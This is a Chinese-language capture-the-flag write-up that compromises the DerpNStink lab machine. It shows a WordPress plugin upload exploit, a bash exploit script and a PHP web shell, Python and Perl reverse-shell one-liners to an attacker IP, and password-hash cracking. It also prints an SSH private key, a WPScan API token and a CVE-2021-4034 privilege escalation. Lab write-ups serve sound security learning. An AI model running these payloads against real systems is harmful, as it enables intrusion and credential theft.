1、nmap -sP 192.168.4.0/24
192.168.4.54

2、nmap 192.168.4.54
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

3、curl http://192.168.4.54/
<--flag1(52E37291AEDF6A46D7D0BB8A6312F4F9F1AA4975C248C3F0E008CBA09D6E9166) -->

<script type="text/info" src="/webnotes/info.txt"></script>


4、curl http://192.168.4.54/webnotes/info.txt

<-- @stinky, make sure to update your hosts file with local dns so the new derpnstink blog can be reached before it goes live -->

<-- @stinky，确保使用本地 dns 更新您的主机文件，以便可以在新的 derpnstink 博客上线之前访问它 -->

意思是要我们更新本地的dns服务，才能访问博客！

5、写入本地hosts中

192.168.4.54 derpnstink.local


6、枚举网页：

dirb http://derpnstink.local/

http://derpnstink.local/weblog/wp-admin/

worepress站！

admin/admin 弱口令登录！

7、wpscan扫描worepress站
wpscan --url http://derpnstink.local/weblog/
WordPress version 4.6.22 identified

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register


8、AWVS扫描：
AWVS扫描：WordPress Plugin Slideshow Gallery (1.6.4)

msf利用：
msfconsole
search Slideshow Gallery
use exploit/unix/webapp/wp_slideshowgallery_upload
set rhosts 192.168.4.58
set targeturi /weblog
set wp_user admin
set wp_password admin
run

获得shell!

9、内网信息收集

拿个稳定的shell：
--------
nc -vlp 6677
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.253.138",6677));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

python -c 'import pty; pty.spawn("/bin/bash")'

ctrl+z
stty raw -echo
fg
---------

cd ../../..    ---来到/var/www/html/weblog目录枚举信息！

grep "root" -rn wp-config.php
/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'mysql');

mysql账号密码获得：
root
mysql


10、登录mysql信息枚举

1）后台枚举
前面dirb扫描出：
http://derpnstink.local/php/phpmyadmin/


2）命令枚举

show databases;
show tables;
select * from wp_users;

admin
$P$BgnU3VLAv.RWd3rdrkfVIuQr6mFvpd/

unclestinky
$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41

echo '$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41' > 2.txt

这时候可以用hash-identifier值去查看是什么类型的密码加密！

john 2.txt --wordlist=/usr/share/wordlists/rockyou.txt
等待几分钟后成功破解~

使用暴破出的用户名/密码：unclestinky/wedgie57进行登录！

11、后台枚举信息

http://derpnstink.local/weblog/wp-admin/
unclestinky
wedgie57

flag2(a7d355b26bda6bf1196ccffead0b2cf2b81f0a9de5b4876b44407f1dc07e51e6)

获得flag2信息！

12、继续搜索flag3信息--ftp
cd /home/
mrderp	stinky
wedgie57

ftp://192.168.4.58/  --登录
ftp://192.168.4.58/files/ssh/ssh/ssh/ssh/ssh/ssh/ssh/
在第七次点击目录下存在File:key.txt文件！

------------------------------------
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAwSaN1OE76mjt64fOpAbKnFyikjz4yV8qYUxki+MjiRPqtDo4
2xba3Oo78y82svuAHBm6YScUos8dHUCTMLA+ogsmoDaJFghZEtQXugP8flgSk9cO
uJzOt9ih/MPmkjzfvDL9oW2Nh1XIctVfTZ6o8ZeJI8Sxh8Eguh+dw69M+Ad0Dimn
AKDPdL7z7SeWg1BJ1q/oIAtJnv7yJz2iMbZ6xOj6/ZDE/2trrrdbSyMc5CyA09/f
5xZ9f1ofSYhiCQ+dp9CTgH/JpKmdsZ21Uus8cbeGk1WpT6B+D8zoNgRxmO3/VyVB
LHXaio3hmxshttdFp4bFc3foTTSyJobGoFX+ewIDAQABAoIBACESDdS2H8EZ6Cqc
nRfehdBR2A/72oj3/1SbdNeys0HkJBppoZR5jE2o2Uzg95ebkiq9iPjbbSAXICAD
D3CVrJOoHxvtWnloQoADynAyAIhNYhjoCIA5cPdvYwTZMeA2BgS+IkkCbeoPGPv4
ZpHuqXR8AqIaKl9ZBNZ5VVTM7fvFVl5afN5eWIZlOTDf++VSDedtR7nL2ggzacNk
Q8JCK9mF62wiIHK5Zjs1lns4Ii2kPw+qObdYoaiFnexucvkMSFD7VAdfFUECQIyq
YVbsp5tec2N4HdhK/B0V8D4+6u9OuoiDFqbdJJWLFQ55e6kspIWQxM/j6PRGQhL0
DeZCLQECgYEA9qUoeblEro6ICqvcrye0ram38XmxAhVIPM7g5QXh58YdB1D6sq6X
VGGEaLxypnUbbDnJQ92Do0AtvqCTBx4VnoMNisce++7IyfTSygbZR8LscZQ51ciu
Qkowz3yp8XMyMw+YkEV5nAw9a4puiecg79rH9WSr4A/XMwHcJ2swloECgYEAyHn7
VNG/Nrc4/yeTqfrxzDBdHm+y9nowlWL+PQim9z+j78tlWX/9P8h98gOlADEvOZvc
fh1eW0gE4DDyRBeYetBytFc0kzZbcQtd7042/oPmpbW55lzKBnnXkO3BI2bgU9Br
7QTsJlcUybZ0MVwgs+Go1Xj7PRisxMSRx8mHbvsCgYBxyLulfBz9Um/cTHDgtTab
L0LWucc5KMxMkTwbK92N6U2XBHrDV9wkZ2CIWPejZz8hbH83Ocfy1jbETJvHms9q
cxcaQMZAf2ZOFQ3xebtfacNemn0b7RrHJibicaaM5xHvkHBXjlWN8e+b3x8jq2b8
gDfjM3A/S8+Bjogb/01JAQKBgGfUvbY9eBKHrO6B+fnEre06c1ArO/5qZLVKczD7
RTazcF3m81P6dRjO52QsPQ4vay0kK3vqDA+s6lGPKDraGbAqO+5paCKCubN/1qP1
14fUmuXijCjikAPwoRQ//5MtWiwuu2cj8Ice/PZIGD/kXk+sJXyCz2TiXcD/qh1W
pF13AoGBAJG43weOx9gyy1Bo64cBtZ7iPJ9doiZ5Y6UWYNxy3/f2wZ37D99NSndz
UBtPqkw0sAptqkjKeNtLCYtHNFJAnE0/uAGoAyX+SHhas0l2IYlUlk8AttcHP1kA
a4Id4FlCiJAXl3/ayyrUghuWWA3jMW3JgZdMyhU3OV+wyZz25S8o
-----END RSA PRIVATE KEY-----
------------------------------------
这是ssh的key密匙！保存到本地key.txt文件中。

chmod 400 key.txt
ssh -i key.txt stinky@192.168.4.58
成功登录！

cd Desktop
cat flag.txt
flag3(07f62b021771d3cf67e2e1faf18769cc5e5c119ad7d4d1847a11e11d6d5a7ecb)

获得flag3!

12、获取flag4方法

方法1：cve-2021-4034

wget https://github.com/arthepsy/CVE-2021-4034/blob/main/cve-2021-4034-poc.c
wget http://192.168.4.55:8081/cve-2021-4034-poc.c
gcc cve-2021-4034-poc.c -o dayu
chmod +x dayu
./dayu

cd /root/Desktop

flag4(49dca65f362fee401292ed7ada96f96295eab1e589c52e4e66bf4aedda715fdd)

成功获得flag4！

------------
方法2：
在/home/stinky/Documents目录下枚举发现derpissues.pcap流量包文件！下载到本地kali枚举！

-----

kali执行：
nc -l -p 8888 > derp.pcap

靶场执行:
nc 192.168.253.138 8888 < derpissues.pcap
-----
wireshark derp.pcap 分析！

1)tcp.stream eq 48    ---tcp追踪  如果追踪UDP就改即可
或者：
2）frame contains mrderp  /login  ---查看流量中登录信息
3）http.request.method == "POST"  ---过滤查看POST请求信息打开双击查看

log=mrderp&pwd=derpderpderpderpderpderpderp

获得账号密码：
mrderp
derpderpderpderpderpderpderp

su mrderp   ---成功登录

sudo -l
(ALL) /home/mrderp/binaries/derpy*

写入脚本覆盖derpy：
-----
#!/bin/bash
bash -i
------
nano dayu.sh
chmod +x dayu.sh

cd /home/mrderp
mkdir binaries
cd binaries
cp /tmp/dayu.sh .
mv dayu.sh derpy.sh
sudo ./derpy.sh

mrderp@DeRPnStiNK:~/binaries$ sudo ./derpy.sh 
root@DeRPnStiNK:~/binaries# id
uid=0(root) gid=0(root) groups=0(root)
获得root权限！获得flag4！


-----------
拓展知识：

nmap -sC -sV -A -O -p -T4 --script http-enum 192.168.4.58


wpscan --url http://derpnstink.local/weblog/
需要官网注册获取新令牌：
https://wpscan.com/register
注册成功后选择免费的就行，会生成一个密匙复制进来！
wpscan --url http://derpnstink.local/weblog/ --api-token 密匙

wpscan --url http://derpnstink.local/weblog/  --api-token kJ4bhZCgveCcoGJPER7AOsHJTeFDf90Wfj9zu0V6asc
找到五个漏洞可以利用！
加入参数 -e u ：
可以发现两个用户和漏洞信息！！

Slideshow Gallery exploit  --谷歌发现
https://www.exploit-db.com/exploits/34681



hashcat -m 400 -a 0 -O 2.txt /usr/share/wordlists/rockyou.txt 
$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41:wedgie57 
另外一种爆破方法！

chmod -rwx key.txt   ----rwx就是400
学习参考菜鸟：https://www.runoob.com/linux/linux-comm-chmod.html


通过谷歌搜索可以利用34681进行webshell！
cp /usr/share/exploitdb/exploits/php/webapps/34681.txt .
mv 34681.txt 34681.py
但是python2的库无法更新，没浪费时间去纠结！！



或者执行：34514漏洞
--------------------------
#!/bin/bash

HOST=derpnstink.local
BLOG=weblog
USER=admin
PASS=$USER
VULN="wp-admin/admin.php?page=slideshow-slides&method=save"
FILE=$1

# authenticate
curl \
    -s \
    -c cookie \
    -d "log=$USER&pwd=$PASS&wp-submit=Log" \
    http://$HOST/$BLOG/wp-login.php

# exploit
curl \
    -s \
    -b cookie \
    -H "Expect:" \
    -o /dev/null \
    -F "Slide[id]=" \
    -F "Slide[order]=" \
    -F "Slide[title]=$(mktemp -u | sed -r 's/^.*tmp\.(.*)$/\1/')" \
    -F "Slide[description]=" \
    -F "Slide[showinfo]=both" \
    -F "Slide[iopacity]=70" \
    -F "Slide[galleries][]=1" \
    -F "Slide[type]=file" \
    -F "image_file=@$FILE;filename=$FILE;type=application/octet-stream" \
    -F "Slide[image_url]=" \
    -F "Slide[uselink]=N" \
    -F "Slide[link]=" \
    -F "Slide[linktarget]=self" \
    -F "submit=Save Slide" \
    http://$HOST/$BLOG/$VULN

# cleanup
rm -rf cookie
---------------------------
保存为upload.sh
<pre><?php echo shell_exec($_GET['cmd']);?></pre>
保存为cmd.php
执行：
./upload.sh cmd.php
然后访问:http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/cmd.php
这时候正常上传了一个cmd的php恶意代码！

用perl的一句话：
perl -e 'use Socket;$i="192.168.1.19";$p=6677;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

kali开启：
nc -vlp 6677

然后浏览器访问：
http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/cmd.php?cmd=perl%20-e%20%27use%20Socket%3B%24i%3D%22192.168.253.138%22%3B%24p%3D6699%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2Fbin%2Fsh%20-i%22%29%3B%7D%3B%27

这时候拿到了一个反弹shell！当然写入的php也可以是普通的一句话，用蚁剑连接就行的！
或者上传php-reverse-shell.php文件，然后直接访问反弹即可！


http://derpnstink.local/php/phpmyadmin/
unclestinky
wedgie57
或者登录后在mysql数据库中user表中发现：
9B776AFB479B31E8047026F1185E952DD1E530CB
然后登录网站：爆破
https://crackstation.net
MySQL4.1+	wedgie57
hash-identifier























